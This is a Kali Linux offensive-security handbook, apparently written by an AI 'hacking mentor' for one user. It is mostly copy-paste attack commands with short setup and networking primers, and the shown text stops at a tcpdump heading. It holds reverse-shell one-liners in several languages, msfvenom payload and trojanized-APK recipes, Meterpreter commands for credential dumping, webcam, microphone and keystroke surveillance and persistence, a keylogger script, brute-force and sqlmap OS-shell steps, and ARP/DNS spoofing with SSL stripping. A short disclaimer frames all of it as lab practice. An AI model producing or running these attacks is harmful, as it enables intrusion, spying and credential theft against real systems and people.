# KALI LINUX ULTIMATE HACKING GUIDE
## From Zero to Elite — Every Tool, Every Technique, Step by Step

---

**Author:** AI Hacking Mentor for Azad
**Date:** May 2026
**Purpose:** Complete Ethical Hacking & Cybersecurity Mastery
**Platform:** Kali Linux on UTM (Mac)

---

> **DISCLAIMER:** This guide is for EDUCATIONAL and AUTHORIZED TESTING only.
> Unauthorized hacking is a CRIME under IT Act 2000 (India) and similar laws worldwide.
> Always get written permission before testing any system.
> Use your own lab environment for practice.

---

# TABLE OF CONTENTS

1. Kali Linux Setup & Optimization
2. Linux Mastery — Commands & Scripting
3. Python for Hacking
4. Networking Deep Dive
5. 150+ Hacking Tools — Complete Reference
6. Reconnaissance & OSINT
7. Network Attacks (MITM, WiFi, Sniffing)
8. Web Application Hacking
9. System Exploitation & Metasploit
10. Privilege Escalation (Linux & Windows)
11. USB & Physical Attacks
12. Mobile Hacking (Android)
13. Social Engineering & Phishing
14. Malware, RATs & C2 Frameworks
15. AV Evasion & Stealth
16. Bug Bounty & Career Guide
17. AI-Powered Hacking
18. Video & Learning Resources
19. Practice Labs & CTF Platforms
20. My Personal Mastery Plan

---

\newpage

# CHAPTER 1: KALI LINUX SETUP & OPTIMIZATION

## UTM Settings (Mac)

```
CPU Cores:     4 (minimum 2)
RAM:           4 GB (minimum 2 GB, 8 GB ideal)
Storage:       40 GB+
Display:       virtio-gpu-gl
Network:       Shared Network (NAT) for internet
               Bridged for same network as host
```

## Network Modes Explained

**NAT (Shared Network)** — DEFAULT
- Internet access: YES
- Scan local network: NO
- Best for: General use, online labs

**Bridged** — Same network as Mac
- Gets own IP on your network
- Can scan local devices
- Best for: Lab practice with VMs

**Host-Only** — Isolated
- Only Mac and VMs communicate
- No internet
- Best for: Safe isolated lab

## First Boot — Run These Commands

```bash
# 1. Update everything
sudo apt update && sudo apt full-upgrade -y
sudo apt autoremove -y

# 2. Change default password (default: kali/kali)
passwd

# 3. Set timezone
sudo timedatectl set-timezone Asia/Kolkata

# 4. Install FULL Kali toolset
sudo apt install -y kali-linux-large

# 5. Install additional tools
sudo apt install -y \
  git curl wget tree htop tmux terminator \
  python3-pip gobuster seclists feroxbuster \
  jq docker.io docker-compose \
  flameshot kazam \
  bloodhound neo4j \
  chisel proxychains4 \
  evil-winrm crackmapexec \
  nuclei subfinder httpx-toolkit

# 6. Extract rockyou.txt wordlist
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# 7. Install Python hacking packages
pip3 install requests beautifulsoup4 scapy paramiko \
  pwntools flask impacket pycryptodome

# 8. Create workspace
mkdir -p ~/hacking/{recon,scans,exploits,payloads,reports,scripts,loot,ctf,tools,notes}

# 9. Setup Metasploit database
sudo systemctl start postgresql
sudo systemctl enable postgresql
sudo msfdb init

# 10. Add useful aliases to ~/.zshrc
cat >> ~/.zshrc << 'EOF'
alias ll='ls -la'
alias update='sudo apt update && sudo apt upgrade -y'
alias myip='ip addr show | grep "inet " | grep -v 127'
alias ports='sudo ss -tulnp'
alias scan='sudo nmap -sV -sC -T4'
alias fullscan='sudo nmap -sS -sV -sC -O -p- -T4 --min-rate=1000'
alias serve='python3 -m http.server 8000'
alias listen='sudo nc -lvnp'
alias msf='sudo msfconsole -q'
EOF
source ~/.zshrc
```

## Installing Practice Labs

```bash
# Start Docker
sudo systemctl start docker

# DVWA — Web hacking practice
sudo docker run -d -p 80:80 vulnerables/web-dvwa
# Access: http://localhost — Login: admin/password

# OWASP Juice Shop — Modern web app
sudo docker run -d -p 3000:3000 bkimminich/juice-shop
# Access: http://localhost:3000

# WebGoat — Interactive lessons
sudo docker run -d -p 8080:8080 webgoat/webgoat
# Access: http://localhost:8080/WebGoat
```

## Download Metasploitable 2 (Vulnerable VM)

```
Download: https://sourceforge.net/projects/metasploitable/
1. Extract ZIP → Find .vmdk file
2. UTM → New VM → Import VMDK
3. RAM: 512 MB, CPU: 1 core
4. Network: Same as Kali
5. Login: msfadmin / msfadmin
```

---

\newpage

# CHAPTER 2: LINUX MASTERY

## Directory Structure (Hacker's Map)

```
/etc/passwd       — User accounts (readable by all)
/etc/shadow       — Password hashes (root only) — GOLDMINE!
/etc/hosts        — Local DNS entries
/etc/crontab      — Scheduled tasks — priv esc vector!
/var/log/          — System logs — forensics info
/tmp/              — World-writable — drop payloads here
/proc/             — Running process info
~/.ssh/            — SSH keys — lateral movement
~/.bash_history    — Command history — credential hunting
```

## Essential Commands

### Navigation & File Operations
```bash
pwd                             # current directory
ls -laR                         # detailed recursive list
cd /etc && cd ~ && cd -         # navigate directories
tree -L 2                       # visual directory tree

touch file.txt                  # create file
mkdir -p dir1/dir2/dir3         # create nested dirs
cp -r source/ dest/             # copy recursively
mv old.txt new.txt              # rename/move
rm -rf directory/               # force delete (CAREFUL!)

cat file.txt                    # print file
head -20 file.txt               # first 20 lines
tail -f /var/log/syslog         # live follow log
less file.txt                   # paginated view
nano file.txt                   # edit file
```

### Searching & Filtering
```bash
find / -name "*.conf" 2>/dev/null              # find by name
find / -perm -4000 -type f 2>/dev/null         # SUID files (PRIV ESC!)
find / -writable -type d 2>/dev/null           # writable directories
find / -name "id_rsa" 2>/dev/null              # SSH private keys

grep -r "password" /etc/ 2>/dev/null           # search in files
grep -i "error" /var/log/syslog                # case-insensitive
grep -n "root" /etc/passwd                     # with line numbers

cat /etc/passwd | cut -d: -f1                  # extract usernames
awk -F: '$3 == 0 {print $1}' /etc/passwd       # find root users
sed 's/old/new/g' file.txt                     # find & replace
sort file.txt | uniq -c | sort -rn             # count occurrences
strings binary | grep -i "pass"                # extract strings
```

### Users & Permissions
```bash
whoami && id                    # current user info
sudo -l                         # CRITICAL! Check sudo permissions

chmod 755 script.sh             # rwxr-xr-x
chmod +x script.sh              # add execute
chown user:group file           # change ownership

# SUID — file runs as OWNER (usually root!)
find / -perm -4000 2>/dev/null  # find SUID files
# If python3 has SUID:
# python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Process & Service Management
```bash
ps aux                          # all processes
ps aux | grep apache            # find specific
kill -9 PID                     # force kill
top / htop                      # real-time monitor

sudo systemctl start ssh        # start SSH server
sudo systemctl start apache2    # start web server
sudo systemctl start postgresql # start database
ss -tulnp                       # show open ports
```

### Networking Commands
```bash
ip addr show                    # show IP addresses
ip route show                   # routing table
ping -c 4 target                # connectivity test
traceroute target               # trace route
dig target.com ANY              # DNS lookup
nslookup target.com             # simple DNS
curl ifconfig.me                # external IP
wget URL -O file                # download file
ss -tulnp                       # open ports
netstat -antp                   # network connections
```

### Package Management
```bash
sudo apt update                 # update package list
sudo apt upgrade -y             # upgrade packages
sudo apt install -y nmap        # install package
sudo apt remove nmap            # remove package
apt search keyword              # search packages
dpkg -l | grep nmap             # check if installed
```

## Bash Scripting for Hackers

### Ping Sweep Script
```bash
#!/bin/bash
echo -n "Enter network (e.g., 192.168.1): "
read network
echo "[*] Scanning $network.0/24..."
for host in $(seq 1 254); do
    ping -c 1 -W 1 $network.$host &>/dev/null && \
    echo "[+] $network.$host is alive" &
done
wait
echo "[*] Done!"
```

### Simple Port Scanner
```bash
#!/bin/bash
echo -n "Enter target IP: "
read target
echo "[*] Scanning $target..."
for port in 21 22 23 25 53 80 110 139 143 443 445 993 995 1433 3306 3389 5432 5900 8080; do
    (echo >/dev/tcp/$target/$port) 2>/dev/null && echo "[+] Port $port OPEN"
done
echo "[*] Done!"
```

### System Enumeration Script
```bash
#!/bin/bash
echo "=== SYSTEM ENUMERATION ==="
echo "[*] OS: $(cat /etc/os-release | grep PRETTY_NAME | cut -d'"' -f2)"
echo "[*] Kernel: $(uname -r)"
echo "[*] User: $(whoami) | ID: $(id)"
echo "[*] Hostname: $(hostname)"
echo ""
echo "[*] Network:"
ip addr show | grep "inet "
echo ""
echo "[*] Open Ports:"
ss -tulnp 2>/dev/null
echo ""
echo "[*] SUID Binaries:"
find / -perm -4000 -type f 2>/dev/null
echo ""
echo "[*] Sudo Permissions:"
sudo -l 2>/dev/null
echo ""
echo "[*] Cron Jobs:"
cat /etc/crontab 2>/dev/null
echo ""
echo "[*] Users with shell:"
grep -v "nologin\|false" /etc/passwd | cut -d: -f1,6,7
```

---

\newpage

# CHAPTER 3: PYTHON FOR HACKING

## Setup
```bash
python3 --version
pip3 install requests beautifulsoup4 scapy paramiko pwntools
```

## Port Scanner (Multi-threaded)
```python
#!/usr/bin/env python3
import socket, threading
from queue import Queue

target = "192.168.1.1"
queue = Queue()
open_ports = []

def scan_port(port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        if sock.connect_ex((target, port)) == 0:
            open_ports.append(port)
            print(f"[+] Port {port} OPEN")
        sock.close()
    except: pass

def worker():
    while not queue.empty():
        scan_port(queue.get())
        queue.task_done()

for port in range(1, 1001): queue.put(port)
for _ in range(100):
    t = threading.Thread(target=worker, daemon=True)
    t.start()
queue.join()
print(f"\nOpen ports: {sorted(open_ports)}")
```

## Web Scraper / Recon
```python
#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup

def recon(url):
    r = requests.get(url, timeout=10)
    soup = BeautifulSoup(r.text, 'html.parser')
    print(f"Title: {soup.title.string if soup.title else 'N/A'}")
    print(f"Server: {r.headers.get('Server', 'N/A')}")
    links = [a.get('href') for a in soup.find_all('a', href=True)]
    print(f"Links found: {len(links)}")
    forms = soup.find_all('form')
    print(f"Forms found: {len(forms)}")
    for form in forms:
        print(f"  Action: {form.get('action')} Method: {form.get('method')}")
        for inp in form.find_all('input'):
            print(f"  Input: {inp.get('name')} ({inp.get('type')})")
```

## ARP Network Scanner
```python
#!/usr/bin/env python3
from scapy.all import ARP, Ether, srp

def scan_network(ip_range):
    result = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_range),
                 timeout=3, verbose=0)[0]
    print(f"{'IP':<20}{'MAC Address':<20}")
    print("-" * 40)
    for _, received in result:
        print(f"{received.psrc:<20}{received.hwsrc:<20}")

# scan_network("192.168.1.0/24")
```

## Hash Cracker
```python
#!/usr/bin/env python3
import hashlib

def crack_hash(target_hash, wordlist, hash_type="md5"):
    funcs = {"md5": hashlib.md5, "sha1": hashlib.sha1, "sha256": hashlib.sha256}
    func = funcs[hash_type]
    with open(wordlist, 'r', errors='ignore') as f:
        for word in f:
            word = word.strip()
            if func(word.encode()).hexdigest() == target_hash:
                print(f"[+] Cracked: {word}")
                return word
    print("[-] Not found")
```

## Brute Force Login
```python
#!/usr/bin/env python3
import requests

def brute_force(url, username, wordlist):
    with open(wordlist, 'r', errors='ignore') as f:
        for password in f:
            password = password.strip()
            r = requests.post(url, data={"username": username, "password": password})
            if "Invalid" not in r.text and "failed" not in r.text.lower():
                print(f"[+] FOUND: {username}:{password}")
                return
            print(f"[-] Trying: {password}")
```

## Keylogger (Lab Only!)
```python
#!/usr/bin/env python3
# pip3 install pynput
from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(filename="keylog.txt", level=logging.DEBUG,
                    format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

# with Listener(on_press=on_press) as listener:
#     listener.join()
```

---

\newpage

# CHAPTER 4: NETWORKING

## Important Ports & Attack Vectors

| Port | Service | Attack Vector |
|------|---------|---------------|
| 21 | FTP | Anonymous login, brute force |
| 22 | SSH | Brute force, key theft |
| 23 | Telnet | Plaintext sniffing |
| 25 | SMTP | Email spoofing, relay |
| 53 | DNS | Zone transfer, poisoning, tunneling |
| 80 | HTTP | SQLi, XSS, LFI, directory traversal |
| 110 | POP3 | Credential sniffing |
| 135 | MSRPC | Windows exploitation |
| 139/445 | SMB | EternalBlue, relay, share enum |
| 443 | HTTPS | SSL stripping |
| 1433 | MSSQL | xp_cmdshell, SQLi |
| 3306 | MySQL | UDF exploitation, brute force |
| 3389 | RDP | BlueKeep, brute force |
| 5432 | PostgreSQL | Command execution |
| 5900 | VNC | Auth bypass, brute force |
| 6379 | Redis | Unauthenticated RCE |
| 8080 | HTTP-Alt | Default credentials |
| 27017 | MongoDB | No-auth access |

## TCP 3-Way Handshake

```
Client → SYN → Server          "Want to connect?"
Client ← SYN/ACK ← Server     "Sure, ready!"
Client → ACK → Server          "Let's go!"
CONNECTION ESTABLISHED

Nmap SYN scan: Only sends SYN, never ACK = "stealth scan"
```

## IP Addressing

```
Private IP ranges (non-routable):
10.0.0.0/8          Class A    16M hosts
172.16.0.0/12       Class B    65K hosts
192.168.0.0/16      Class C    254 hosts per /24

Special:
127.0.0.1           Localhost
0.0.0.0             All interfaces
255.255.255.255     Broadcast
```

---

\newpage

# CHAPTER 5: COMPLETE TOOLS REFERENCE (150+ TOOLS)

## CATEGORY 1: RECONNAISSANCE & SCANNING

### Nmap — The King of Scanners

```bash
# Host Discovery
nmap -sn 192.168.1.0/24                     # ping sweep
nmap -Pn TARGET                              # skip ping

# Port Scanning
nmap -sS TARGET                              # SYN scan (stealth)
nmap -sT TARGET                              # TCP connect scan
nmap -sU TARGET                              # UDP scan
nmap -p 80,443,8080 TARGET                   # specific ports
nmap -p- TARGET                              # ALL 65535 ports
nmap -F TARGET                               # fast (top 100)
nmap --top-ports 1000 TARGET                 # top 1000

# Service & OS Detection
nmap -sV TARGET                              # service versions
nmap -O TARGET                               # OS detection
nmap -A TARGET                               # aggressive (all)

# Timing
nmap -T0 TARGET    # paranoid (IDS evasion)
nmap -T4 TARGET    # aggressive (recommended)

# NSE Scripts
nmap --script=vuln TARGET                    # vulnerability scan
nmap --script=smb-vuln* TARGET               # SMB vulns
nmap --script=http-enum TARGET               # web enumeration
nmap --script=ftp-anon TARGET                # anonymous FTP
nmap --script=ssh-brute TARGET               # SSH brute force

# Output
nmap -oA scan_results TARGET                 # save all formats

# ULTIMATE SCAN (copy-paste this!)
sudo nmap -sS -sV -sC -O -A -p- -T4 --min-rate=1000 -oA full TARGET
```

**Step by step kaise use kare:**
1. Terminal kholo Kali mein
2. `sudo nmap -sn 192.168.1.0/24` — pehle network scan karo
3. Jo IPs milein unpe `nmap -sV -sC TARGET_IP` — services dekho
4. Interesting services pe `nmap --script=vuln TARGET_IP` — vulns dhundho
5. Results save karo: `nmap -oA results TARGET_IP`

---

### Masscan — Ultra-Fast Scanner

```bash
# Scan all ports at high speed
masscan -p1-65535 TARGET --rate=1000

# Scan specific ports across subnet
masscan 192.168.1.0/24 -p80,443 --rate=10000

# Output to file
masscan TARGET -p1-65535 --rate=1000 -oG results.txt
```

**Kab use kare:** Jab bahut bade network scan karna ho, Nmap se zyada fast hai.

---

### Netdiscover — ARP Scanner

```bash
sudo netdiscover -r 192.168.1.0/24          # active scan
sudo netdiscover -i eth0 -p                  # passive (stealthy)
```

**Kab use kare:** Local network pe devices dhundhne ke liye.

---

### Subfinder — Subdomain Discovery

```bash
subfinder -d target.com -o subs.txt          # find subdomains
subfinder -d target.com -all                 # use all sources
subfinder -d target.com -silent | httpx      # find + probe
```

**Step by step:**
1. `subfinder -d target.com -o subs.txt` — subdomains nikaalo
2. `cat subs.txt | httpx -sc -title` — check which are live
3. Live hosts pe further scanning karo

---

### Amass — Advanced Subdomain Enumeration

```bash
amass enum -d target.com                     # active enum
amass enum -passive -d target.com            # passive (stealthy)
amass enum -d target.com -o results.txt      # save output
```

---

### httpx — HTTP Probe

```bash
cat subdomains.txt | httpx -sc -title -tech-detect -o live.txt
# -sc = status code, -title = page title, -tech-detect = technologies
```

---

### Nuclei — AI-Powered Vulnerability Scanner

```bash
sudo apt install -y nuclei
nuclei -update-templates                     # update templates

nuclei -u https://target.com                 # scan single URL
nuclei -u URL -severity critical,high        # only critical/high
nuclei -u URL -tags cve,xss,sqli            # specific vuln types
nuclei -l urls.txt                           # bulk scan from file

# Automated pipeline
subfinder -d target.com -silent | httpx -silent | nuclei -severity critical,high
```

**Step by step:**
1. URLs ki list banao (subfinder + httpx se)
2. `nuclei -l urls.txt -severity critical,high -o vulns.txt`
3. Results dekho — har finding mein details hogi
4. Manual verification karo Burp Suite se

---

### Nikto — Web Vulnerability Scanner

```bash
nikto -h http://target.com                   # basic scan
nikto -h http://target.com -p 8080           # custom port
nikto -h target -output results.txt          # save output
```

---

### WhatWeb — Technology Detection

```bash
whatweb http://target.com                    # detect tech
whatweb -a 3 http://target.com               # aggressive mode
```

---

### theHarvester — Email & Subdomain Gathering

```bash
theHarvester -d target.com -b all -l 500     # all sources
theHarvester -d target.com -b google         # Google only
```

---

### Sherlock — Username OSINT

```bash
sherlock username                            # search all platforms
sherlock user1 user2 user3                   # multiple users
sherlock username --output results.txt       # save output
```

---

### Maigret — Better Username OSINT

```bash
pip3 install maigret
maigret username --all-sites                 # search 2500+ sites
```

---

### Holehe — Email Registration Check

```bash
pip3 install holehe
holehe target@email.com                      # check registrations
```

---

### Recon-ng — OSINT Framework

```bash
recon-ng
> marketplace search                         # list modules
> marketplace install recon/domains-hosts/google_site_web
> modules load recon/domains-hosts/google_site_web
> options set SOURCE target.com
> run
```

---

### Maltego — Visual OSINT (GUI)

```bash
maltego                                      # launch GUI
# Drag entities → Run transforms → Map relationships
```

---

### EyeWitness — Website Screenshots

```bash
eyewitness --web -f urls.txt -d screenshots/
# Takes screenshots of all URLs — great for documentation
```

---

## CATEGORY 2: WEB APPLICATION TESTING

### Gobuster — Directory Brute Force

```bash
# Directory scan
gobuster dir -u http://target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50

# With file extensions
gobuster dir -u http://target -w wordlist.txt -x php,html,txt,bak,old

# DNS subdomain brute force
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Virtual host discovery
gobuster vhost -u http://target -w wordlist.txt
```

**Step by step:**
1. `gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt`
2. Interesting directories milein toh browser mein check karo
3. Login pages, admin panels, backup files dhundho
4. Extensions add karo: `-x php,html,txt,bak`

---

### ffuf — Fast Fuzzer

```bash
# Directory fuzzing
ffuf -u http://target/FUZZ -w wordlist.txt -mc 200,301,302

# With extensions
ffuf -u http://target/FUZZ -w wordlist.txt -e .php,.html,.txt,.bak

# Parameter fuzzing
ffuf -u "http://target/page?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

# POST data fuzzing (login brute force)
ffuf -u http://target/login -X POST -d "username=admin&password=FUZZ" -w rockyou.txt -fc 401

# Subdomain fuzzing
ffuf -u http://FUZZ.target.com -w wordlist.txt -mc 200
```

---

### Feroxbuster — Recursive Directory Scanner

```bash
feroxbuster -u http://target -w wordlist.txt --depth 3
feroxbuster -u http://target -w wordlist.txt -x php,html,txt
```

---

### Dirb — Directory Scanner

```bash
dirb http://target /usr/share/wordlists/dirb/common.txt
dirb http://target -o output.txt
```

---

### Burp Suite — Web Proxy (GUI)

```
Setup:
1. Open Burp Suite (pre-installed in Kali)
2. Proxy tab → Intercept ON
3. Browser proxy: 127.0.0.1:8080
4. Install Burp CA certificate in browser

Key Features:
- Proxy: Intercept & modify requests
- Repeater: Modify and resend requests (Ctrl+R)
- Intruder: Automated attacks (brute force, fuzzing)
- Decoder: Encode/decode data
- Scanner: Auto vuln scanning (Pro only)

Must-Install Extensions:
- Autorize (access control testing)
- Logger++ (enhanced logging)
- Param Miner (hidden parameters)
- JS Link Finder (find API endpoints)
- Turbo Intruder (ultra-fast attacks)

Step by step usage:
1. Set browser proxy to 127.0.0.1:8080
2. Browse target website → Burp captures all requests
3. Find interesting request → Right-click → Send to Repeater
4. Modify parameters → Click Send → Analyze response
5. Found input field → Test for SQLi, XSS
6. For brute force → Send to Intruder → Set positions → Start attack
```

---

### SQLMap — SQL Injection Automation

```bash
# Basic scan
sqlmap -u "http://target/page?id=1" --batch --random-agent

# From Burp Suite request (BEST method!)
# Save request from Burp → File → request.txt
sqlmap -r request.txt --batch --level=5 --risk=3

# Enumerate databases
sqlmap -r request.txt --dbs

# Enumerate tables
sqlmap -r request.txt -D database_name --tables

# Dump data
sqlmap -r request.txt -D database_name -T users --dump

# Get OS shell!
sqlmap -r request.txt --os-shell

# Read server files
sqlmap -r request.txt --file-read="/etc/passwd"

# WAF bypass
sqlmap -r request.txt --tamper=space2comment,between

# Through TOR
sqlmap -r request.txt --tor --tor-type=SOCKS5
```

**Step by step SQLMap:**
1. Burp Suite mein login request intercept karo
2. Right-click → Save Item → `request.txt`
3. `sqlmap -r request.txt --batch --dbs` — databases dhundho
4. `sqlmap -r request.txt -D db_name --tables` — tables dhundho
5. `sqlmap -r request.txt -D db_name -T users --dump` — data nikaalo!

---

### WPScan — WordPress Scanner

```bash
wpscan --url http://target                   # basic scan
wpscan --url http://target --enumerate u,vp,vt  # users + plugins + themes
wpscan --url http://target -U admin -P wordlist.txt  # brute force
wpscan --url http://target --api-token YOUR_TOKEN    # with vuln database
```

---

### XSStrike — XSS Scanner

```bash
pip3 install xsstrike
xsstrike -u "http://target/page?param=test"
xsstrike -u "http://target/search?q=test" --crawl
```

---

### Commix — Command Injection

```bash
commix -u "http://target/page?cmd=test"
commix -r request.txt                        # from Burp
```

---

## CATEGORY 3: EXPLOITATION

### Metasploit Framework

```bash
# Start Metasploit
sudo systemctl start postgresql
msfconsole

# Search for exploits
search eternalblue
search type:exploit platform:windows smb
search cve:2021-44228

# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS TARGET_IP
set LHOST YOUR_IP
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

# Session management
sessions -l                      # list sessions
sessions -i 1                    # interact with session
sessions -k 1                    # kill session
```

**Step by step Metasploit:**
1. `msfconsole` — open Metasploit
2. `search service_name version` — exploit dhundho
3. `use exploit/path` — exploit select karo
4. `show options` — required settings dekho
5. `set RHOSTS target_ip` — target set karo
6. `set LHOST your_ip` — apna IP set karo
7. `exploit` — FIRE!
8. Shell milega → commands run karo

---

### msfvenom — Payload Generator

```bash
# Windows reverse shell EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe

# Linux ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf

# PHP web shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php

# Python payload
msfvenom -p python/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.py

# Android APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 R > evil.apk

# PowerShell (fileless!)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f psh -o shell.ps1

# HTA (opens in browser)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f hta-psh -o evil.hta

# Inject into existing APK
msfvenom -x original.apk -p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -o trojan.apk

# HANDLER — Always start this FIRST!
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST YOUR_IP; set LPORT 4444; exploit -j"
```

---

### Meterpreter Commands (Post-Exploitation)

```bash
# ONCE YOU HAVE A SESSION:
sysinfo                          # system info
getuid                           # current user
getsystem                        # try to get SYSTEM/root

# Credential Harvesting
hashdump                         # dump password hashes
load kiwi                       # load Mimikatz
creds_all                        # ALL credentials!
creds_wdigest                    # plaintext passwords

# Surveillance
screenshot                       # take screenshot
screenshare                      # live screen!
webcam_list                      # list cameras
webcam_snap                      # take photo
webcam_stream                    # live camera
record_mic -d 30                 # record mic 30 sec
keyscan_start                    # start keylogger
keyscan_dump                     # show captured keys

# File operations
download "C:\\secret.txt"        # download file
upload backdoor.exe              # upload file
search -f "*.docx"               # search files
search -f "password*"            # search password files

# Network & Pivoting
ipconfig                         # network info
portfwd add -l 3389 -p 3389 -r TARGET  # port forward
run autoroute -s 10.0.0.0/24    # add internal route

# Persistence
run persistence -U -i 30 -p 4444 -r YOUR_IP
run post/windows/manage/enable_rdp
```

---

### SearchSploit — Exploit Database Search

```bash
searchsploit apache 2.4                     # search exploits
searchsploit -m 12345                        # copy exploit locally
searchsploit --cve CVE-2021-44228           # search by CVE
searchsploit -x 12345                        # examine exploit
```

---

### Netcat — Swiss Army Knife

```bash
nc -lvnp 4444                               # listener (catch shells)
nc TARGET 80                                 # connect to port
nc -e /bin/bash TARGET 4444                  # reverse shell
nc -lvnp 9999 > received_file               # receive file
nc TARGET 9999 < file.txt                    # send file
```

---

### Reverse Shell One-Liners

```bash
# Bash
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Netcat
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc YOUR_IP 4444 >/tmp/f

# PHP
php -r '$sock=fsockopen("YOUR_IP",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

# PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Upgrade dumb shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## CATEGORY 4: PASSWORD ATTACKS

### Hydra — Online Brute Force

```bash
# SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://TARGET

# FTP
hydra -l admin -P rockyou.txt ftp://TARGET

# HTTP POST form
hydra -l admin -P wordlist.txt TARGET http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# RDP
hydra -l administrator -P wordlist.txt rdp://TARGET

# MySQL
hydra -l root -P wordlist.txt mysql://TARGET

# Multiple users
hydra -L users.txt -P passwords.txt ssh://TARGET -t 4

# Flags: -V verbose, -f stop on first, -t threads
```

**Step by step:**
1. Target ka login page dhundho (SSH, FTP, web form)
2. Username guess karo (admin, root, etc.) ya list banao
3. `hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://TARGET`
4. Wait for `[22][ssh] host: TARGET login: admin password: found123`

---

### John the Ripper — Offline Hash Cracking

```bash
# Basic usage
john --wordlist=rockyou.txt hashes.txt

# Specify hash format
john --format=raw-md5 --wordlist=rockyou.txt hash.txt
john --format=raw-sha256 hash.txt
john --format=NT hash.txt                    # Windows NTLM

# Crack Linux passwords
sudo unshadow /etc/passwd /etc/shadow > combined.txt
john --wordlist=rockyou.txt combined.txt

# Crack ZIP, SSH, PDF files
zip2john protected.zip > zip.hash
ssh2john id_rsa > ssh.hash
pdf2john protected.pdf > pdf.hash
john --wordlist=rockyou.txt zip.hash

# Show cracked
john --show hashes.txt

# With rules (smart mutations)
john --wordlist=rockyou.txt --rules hashes.txt
```

---

### Hashcat — GPU-Powered Cracking

```bash
# Hash modes:
# -m 0     MD5
# -m 100   SHA1
# -m 1000  NTLM (Windows)
# -m 1400  SHA256
# -m 1800  SHA512crypt (Linux)
# -m 3200  bcrypt
# -m 22000 WPA

hashcat -m 0 hashes.txt rockyou.txt          # MD5
hashcat -m 1000 hashes.txt rockyou.txt       # NTLM
hashcat -m 22000 wifi.hc22000 rockyou.txt    # WPA

# Brute force
hashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a     # 6 chars all

# Mask
hashcat -m 0 hash.txt -a 3 ?u?l?l?l?d?d?d?d # Uppercase+lower+digits

# Show results
hashcat -m 0 hash.txt --show
```

---

### Responder — Capture Network Credentials

```bash
sudo responder -I eth0 -dwPv
# Captures NTLMv2 hashes from Windows machines on network!
# Hashes saved in /usr/share/responder/logs/
# Crack with: hashcat -m 5600 hash.txt rockyou.txt
```

---

### CeWL — Custom Wordlist Generator

```bash
cewl http://target.com -d 3 -m 5 -w wordlist.txt
# -d depth, -m minimum word length
# Creates wordlist from website content!
```

---

### Crunch — Custom Wordlist Creator

```bash
crunch 8 8 -t @@@@%%%% -o wordlist.txt       # 8 chars: 4 letters + 4 numbers
crunch 6 8 abcdef123 -o wordlist.txt         # custom charset
```

---

## CATEGORY 5: NETWORK ATTACKS

### Bettercap — MITM Framework

```bash
sudo bettercap -iface eth0

# Inside Bettercap:
net.probe on                                  # discover devices
net.show                                      # show devices
set arp.spoof.targets VICTIM_IP              # set target
arp.spoof on                                  # start ARP spoofing
net.sniff on                                  # start sniffing

# DNS Spoofing
set dns.spoof.domains facebook.com
set dns.spoof.address YOUR_IP
dns.spoof on

# SSL Strip
set http.proxy.sslstrip true
http.proxy on
```

**Step by step MITM:**
1. `sudo bettercap -iface eth0`
2. `net.probe on` → `net.show` — devices dhundho
3. `set arp.spoof.targets VICTIM_IP` — target select karo
4. `arp.spoof on` — ARP spoofing shuru!
5. `net.sniff on` — traffic capture shuru!
6. Victim ka HTTP traffic ab tum dekh sakte ho

---

### Ettercap — MITM Tool

```bash
sudo ettercap -G                              # GUI mode
sudo ettercap -T -q -i eth0 -M arp:remote /VICTIM// /GATEWAY//
```

---

### Wireshark — Packet Analyzer (GUI)

```
Essential filters:
http                              # HTTP traffic
http.request.method == "POST"     # POST requests (logins!)
ftp.request.command == "PASS"     # FTP passwords
ip.addr == 192.168.1.100         # specific IP
tcp.port == 80                    # specific port
http contains "password"          # password in HTTP

Right-click → Follow → TCP Stream = full conversation!
```

---

### tcpdump — CLI Packet Capture
